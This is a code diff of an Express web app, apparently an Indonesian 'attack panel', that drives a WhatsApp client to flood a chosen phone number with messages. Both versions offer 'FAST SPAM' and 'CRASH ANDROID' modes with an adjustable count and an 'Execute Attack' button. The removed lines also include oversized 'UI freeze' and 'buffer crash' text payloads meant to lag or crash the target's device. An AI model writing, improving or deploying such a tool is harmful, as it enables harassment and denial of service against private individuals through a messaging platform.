@@ -5,8 +5,6 @@ const bodyParser = require('body-parser');
 
 const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
-
-// BIAR BISA JALAN DI RAILWAY/RENDER
 const port = process.env.PORT || 3000;
 
 const client = new Client({
@@ -18,102 +16,57 @@ const client = new Client({
 });
 
 client.on('qr', (qr) => {
-    console.log('SCAN QR INI, BOS:');
+    console.log('SCAN QR DI LOG RAILWAY:');
     qrcode.generate(qr, {small: true});
 });
 
 client.on('ready', () => {
-    console.log(`\n====================================`);
-    console.log(`PANEL READY! PORT: ${port}`);
-    console.log(`====================================\n`);
+    console.log('WA-BOT ONLINE!');
 });
 
-// --- UI DASHBOARD SANGAR ---
 app.get('/', (req, res) => {
     res.send(`
-        <html>
         <head>
-            <title>DN SCRIPTS - PANEL</title>
+            <title>TOPAA SCRIPTS</title>
             <style>
-                body { background: #050505; color: white; font-family: 'Courier New', sans-serif; display: flex; justify-content: center; padding: 20px; }
-                .card { width: 100%; max-width: 380px; background: #0f0f0f; border-radius: 15px; border: 1px solid #ff0055; overflow: hidden; box-shadow: 0 0 20px #ff005544; }
-                .banner { width: 100%; height: 150px; background: linear-gradient(rgba(0,0,0,0.5), #0f0f0f), url('https://wallpapercave.com/wp/wp10503071.jpg'); background-size: cover; display: flex; align-items: center; justify-content: center; }
-                .content { padding: 20px; }
-                label { color: #ff0055; font-size: 11px; font-weight: bold; text-transform: uppercase; display: block; margin-bottom: 5px; }
-                input, select { width: 100%; background: #1a1a1a; border: 1px solid #333; padding: 12px; color: white; border-radius: 8px; margin-bottom: 15px; outline: none; }
-                button { width: 100%; background: #ff0055; color: white; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
-                button:hover { background: #cc0044; box-shadow: 0 0 10px #ff0055; }
-                .profile { display: flex; align-items: center; margin-bottom: 20px; background: #151515; padding: 10px; border-radius: 10px; }
-                .avatar { width: 35px; height: 35px; background: #ff0055; border-radius: 50%; margin-right: 10px; }
+                body { background: #0a0a0a; color: #ff0055; font-family: sans-serif; text-align: center; padding: 50px; }
+                .panel { border: 2px solid #ff0055; display: inline-block; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px #ff0055; }
+                input, select, button { width: 100%; margin: 10px 0; padding: 10px; border-radius: 5px; border: none; }
+                button { background: #ff0055; color: white; font-weight: bold; cursor: pointer; }
             </style>
         </head>
         <body>
-            <div class="card">
-                <div class="banner">
-                    <h2 style="color:#ff0055; text-shadow: 0 0 10px #ff0055;">NAMA LU DISINI</h2>
-                </div>
-                <div class="content">
-                    <div class="profile">
-                        <div class="avatar"></div>
-                        <div>
-                            <div style="font-size: 14px; font-weight: bold;">NAMA LU</div>
-                            <div style="font-size: 10px; color: #666;">ROLE: OWNER / DEV</div>
-                        </div>
-                    </div>
-
-                    <form action="/attack" method="POST">
-                        <label>Target Number</label>
-                        <input type="text" name="number" placeholder="62812xxxxx" required>
-                        
-                        <label>Select Payload / Bug</label>
-                        <select name="type">
-                            <option value="spam">💥 FAST SPAM</option>
-                            <option value="freeze">☣️ UI FREEZE (Heavy Text)</option>
-                            <option value="crash">💀 CRASH ANDROID (Buffer)</option>
-                            <option value="delay">🌫️ GHOST DELAY</option>
-                        </select>
-
-                        <label>Count / Loop</label>
-                        <input type="number" name="count" value="10">
-
-                        <button type="submit">Execute Attack!</button>
-                    </form>
-                </div>
+            <div class="panel">
+                <h1>TOPAA PANEL</h1>
+                <form action="/attack" method="POST">
+                    <input type="text" name="number" placeholder="628xxxx" required>
+                    <select name="type">
+                        <option value="spam">FAST SPAM</option>
+                        <option value="crash">CRASH ANDROID</option>
+                    </select>
+                    <input type="number" name="count" placeholder="Jumlah" required>
+                    <button type="submit">EXECUTE ATTACK!</button>
+                </form>
             </div>
         </body>
-        </html>
     `);
 });
 
-// --- LOGIKA EKSEKUSI ---
 app.post('/attack', async (req, res) => {
     const { number, type, count } = req.body;
     const chatId = number + "@c.us";
-    
-    // GANTI "BY NAMA LU" DI BAWAH INI
-    let text = "ATTACKED BY NAMA LU - "; 
-
-    if (type === "freeze") text = "░".repeat(10000); 
-    if (type === "spam") text += "🔥 AWAS HP LU MELEDAK 🔥";
-    if (type === "crash") text = "Buffer-Crash-".repeat(1000);
-    if (type === "delay") text = " ".repeat(4000) + "Invisible-Lag";
-
-    console.log(`[!] Menyerang ${number} | Mode: ${type} | Jumlah: ${count}`);
+    let text = "🔥 ATTACKED BY TOPAA 🔥"; // NAMA SUDAH DIGANTI
 
     for (let i = 0; i < count; i++) {
         try {
             await client.sendMessage(chatId, text);
-            console.log(`[✔] Packet ${i+1} sent.`);
-            await new Promise(r => setTimeout(r, 800)); 
-        } catch (e) {
-            console.log("Error: " + e);
-        }
+            await new Promise(r => setTimeout(r, 1000));
+        } catch (e) { console.log(e); }
     }
-    res.send('<h1>SERANGAN TERKIRIM!</h1><a href="/" style="color:red;">KEMBALI KE PANEL</a>');
+    res.send('SUKSES! <a href="/">Kembali</a>');
 });
 
-app.listen(port, () => {
-    console.log(`Server running on port ${port}`);
+app.listen(port, '0.0.0.0', () => {
+    console.log('Server running on port ' + port);
 });
-
 client.initialize();
